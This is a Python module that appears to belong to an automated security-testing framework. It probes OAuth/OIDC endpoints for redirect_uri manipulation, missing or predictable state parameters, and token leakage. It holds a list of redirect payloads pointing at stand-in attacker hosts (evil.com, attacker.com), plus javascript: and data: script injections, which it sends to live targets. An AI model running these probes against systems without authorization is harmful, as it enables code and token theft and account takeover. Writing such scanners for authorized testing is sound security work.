"""
OAuth/OIDC Attack Flows — redirect_uri manipulation, state bypass, token theft.

Tests:
1. Redirect URI manipulation (open redirect, subdomain takeover)
2. State parameter bypass
3. PKCE bypass
4. Token theft via referer leakage
5. Implicit flow token leakage
6. Scope escalation
"""

import asyncio
import re
import json
from typing import Dict, List, Any, Optional
from skills.base import BaseSkill, SkillResult


# OAuth providers to test
OAUTH_PROVIDERS = {
    "google": {
        "auth_url": "https://accounts.google.com/o/oauth2/auth",
        "token_url": "https://oauth2.googleapis.com/token",
        "redirect_pattern": r"redirect_uri=([^&]+)",
    },
    "github": {
        "auth_url": "https://github.com/login/oauth/authorize",
        "token_url": "https://github.com/login/oauth/access_token",
        "redirect_pattern": r"redirect_uri=([^&]+)",
    },
    "facebook": {
        "auth_url": "https://www.facebook.com/v18.0/dialog/oauth",
        "token_url": "https://graph.facebook.com/oauth/access_token",
        "redirect_pattern": r"redirect_uri=([^&]+)",
    },
    "microsoft": {
        "auth_url": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize",
        "token_url": "https://login.microsoftonline.com/common/oauth2/v2.0/token",
        "redirect_pattern": r"redirect_uri=([^&]+)",
    },
}

# Redirect URI manipulation payloads
REDIRECT_PAYLOADS = [
    "https://evil.com",
    "https://{target}.evil.com",
    "https://{target}@evil.com",
    "https://evil.com?next={target}",
    "https://{target}.attacker.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "https://evil.com#{original_redirect}",
]


class OAuthAttackSkill(BaseSkill):
    """
    OAuth/OIDC attack flows — redirect manipulation, state bypass, token theft.
    """

    def can_handle(self, task_type: str) -> bool:
        return task_type in ["oauth", "oidc", "oauth_attack", "redirect_uri", "auth_flow"]

    async def execute(self, context: Dict[str, Any]) -> SkillResult:
        target = context.get("target", "")
        urls = context.get("urls", [])
        
        findings = []
        
        # Discover OAuth endpoints
        oauth_endpoints = await self._discover_oauth(urls)
        
        # Test redirect URI manipulation
        for endpoint in oauth_endpoints[:5]:
            redirect_findings = await self._test_redirect_uri(endpoint, target)
            findings.extend(redirect_findings)
        
        # Test state parameter
        for endpoint in oauth_endpoints[:5]:
            state_findings = await self._test_state_parameter(endpoint)
            findings.extend(state_findings)
        
        # Test for token leakage
        for url in urls[:5]:
            leakage_findings = await self._test_token_leakage(url)
            findings.extend(leakage_findings)

        return SkillResult(
            success=True,
            findings=findings,
            data={"oauth_endpoints": len(oauth_endpoints), "oauth_findings": len(findings)},
            next_skills=["validate"],
            confidence=min(len(findings) / 2, 1.0) if findings else 0.0,
        )

    async def _discover_oauth(self, urls: List[str]) -> List[Dict]:
        """Discover OAuth endpoints in pages."""
        endpoints = []
        
        for url in urls[:5]:
            try:
                proc = await asyncio.create_subprocess_exec(
                    "curl", "-s", "-L", "--max-time", "10",
                    url,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await proc.communicate()
                html = stdout.decode(errors="ignore")
                
                # Find OAuth authorization URLs
                patterns = [
                    r'(https://[^"\']+/oauth/authorize[^"\']*)',
                    r'(https://[^"\']+/oauth2/auth[^"\']*)',
                    r'(https://[^"\']+/dialog/oauth[^"\']*)',
                    r'(https://[^"\']+/connect/authorize[^"\']*)',
                    r'(https://accounts\.google\.com/o/oauth2/auth[^"\']*)',
                    r'(https://github\.com/login/oauth/authorize[^"\']*)',
                ]
                
                for pattern in patterns:
                    matches = re.findall(pattern, html)
                    for match in matches:
                        endpoints.append({"url": match, "source": url})
            except Exception:
                continue
        
        return endpoints

    async def _test_redirect_uri(self, endpoint: Dict, target: str) -> List[Dict]:
        """Test redirect URI manipulation."""
        findings = []
        
        original_url = endpoint.get("url", "")
        
        for payload_template in REDIRECT_PAYLOADS:
            payload = payload_template.replace("{target}", target)
            
            # Modify redirect_uri in URL
            if "redirect_uri=" in original_url:
                manipulated = re.sub(
                    r'redirect_uri=[^&]+',
                    f'redirect_uri={payload}',
                    original_url
                )
            else:
                separator = "&" if "?" in original_url else "?"
                manipulated = f"{original_url}{separator}redirect_uri={payload}"
            
            # Send request and check response
            result = await self._test_url(manipulated)
            if result:
                # Check if redirect is followed
                if result.get("status") in (301, 302, 303, 307, 308):
                    location = result.get("headers", {}).get("location", "")
                    if payload in location or "evil.com" in location:
                        findings.append({
                            "type": "oauth_redirect_uri_manipulation",
                            "url": original_url,
                            "severity": "critical",
                            "confidence": 0.95,
                            "cvss_score": 9.5,
                            "evidence": f"Server redirects to attacker-controlled URL: {location}",
                            "payload": payload,
                            "param": "redirect_uri",
                            "description": "OAuth redirect URI manipulation — authorization code/tokens can be stolen",
                            "source_tool": "oauth-attack",
                        })
                
                # Check if error is not shown (some servers silently accept)
                if result.get("status") == 200 and "error" not in result.get("body", "").lower():
                    findings.append({
                        "type": "oauth_redirect_uri_not_validated",
                        "url": original_url,
                        "severity": "high",
                        "confidence": 0.8,
                        "cvss_score": 7.5,
                        "evidence": f"Server accepts arbitrary redirect_uri without error",
                        "payload": payload,
                        "param": "redirect_uri",
                        "description": "OAuth redirect URI not validated — open redirect possible",
                        "source_tool": "oauth-attack",
                    })
        
        return findings

    async def _test_state_parameter(self, endpoint: Dict) -> List[Dict]:
        """Test state parameter validation."""
        findings = []
        
        original_url = endpoint.get("url", "")
        
        # Test 1: Remove state parameter
        no_state = re.sub(r'&state=[^&]+', '', original_url)
        if no_state != original_url:
            result = await self._test_url(no_state)
            if result and result.get("status") == 200:
                if "csrf" not in result.get("body", "").lower() and "error" not in result.get("body", "").lower():
                    findings.append({
                        "type": "oauth_state_missing",
                        "url": original_url,
                        "severity": "high",
                        "confidence": 0.85,
                        "cvss_score": 7.5,
                        "evidence": "OAuth flow works without state parameter — CSRF possible",
                        "payload": "state parameter removed",
                        "param": "state",
                        "description": "OAuth state parameter not required — CSRF attack possible",
                        "source_tool": "oauth-attack",
                    })
        
        # Test 2: Use predictable state
        predictable_state = original_url.replace("state=", "state=12345") if "state=" in original_url else original_url
        if predictable_state != original_url:
            result = await self._test_url(predictable_state)
            if result and result.get("status") == 200:
                if "error" not in result.get("body", "").lower():
                    findings.append({
                        "type": "oauth_state_predictable",
                        "url": original_url,
                        "severity": "medium",
                        "confidence": 0.7,
                        "cvss_score": 5.0,
                        "evidence": "Server accepts predictable state parameter",
                        "payload": "state=12345",
                        "param": "state",
                        "description": "OAuth state parameter not validated — predictable state accepted",
                        "source_tool": "oauth-attack",
                    })
        
        return findings

    async def _test_token_leakage(self, url: str) -> List[Dict]:
        """Test for OAuth token leakage in URLs/logs."""
        findings = []
        
        try:
            proc = await asyncio.create_subprocess_exec(
                "curl", "-s", "-i", "--max-time", "10",
                url,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            response = stdout.decode(errors="ignore")
            
            # Check for tokens in response
            token_patterns = [
                r'access_token=([^&"\']+)',
                r'id_token=([^&"\']+)',
                r'refresh_token=([^&"\']+)',
                r'code=([^&"\']+)',
            ]
            
            for pattern in token_patterns:
                matches = re.findall(pattern, response)
                for match in matches:
                    if len(match) > 20:  # Likely a real token
                        findings.append({
                            "type": "oauth_token_leakage",
                            "url": url,
                            "severity": "critical",
                            "confidence": 0.9,
                            "cvss_score": 9.0,
                            "evidence": f"OAuth token leaked in URL: {pattern.split('(')[0]}{match[:30]}...",
                            "payload": match,
                            "param": "URL Parameters",
                            "description": "OAuth token exposed in URL — may be logged in server logs, browser history, referer headers",
                            "source_tool": "oauth-attack",
                        })
        except Exception:
            pass
        
        return findings

    async def _test_url(self, url: str) -> Optional[Dict]:
        """Test a URL and return response info."""
        try:
            proc = await asyncio.create_subprocess_exec(
                "curl", "-s", "-i", "--max-time", "10", "-L", url,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            response = stdout.decode(errors="ignore")
            
            status_match = re.search(r'HTTP/[\d.]+\s+(\d+)', response)
            status = int(status_match.group(1)) if status_match else 0
            
            # Parse headers
            headers = {}
            header_section = response.split("\r\n\r\n")[0] if "\r\n\r\n" in response else ""
            for line in header_section.split("\r\n"):
                if ":" in line:
                    key, value = line.split(":", 1)
                    headers[key.strip().lower()] = value.strip()
            
            body = response.split("\r\n\r\n")[1] if "\r\n\r\n" in response else ""
            
            return {"status": status, "headers": headers, "body": body}
        except Exception:
            return None
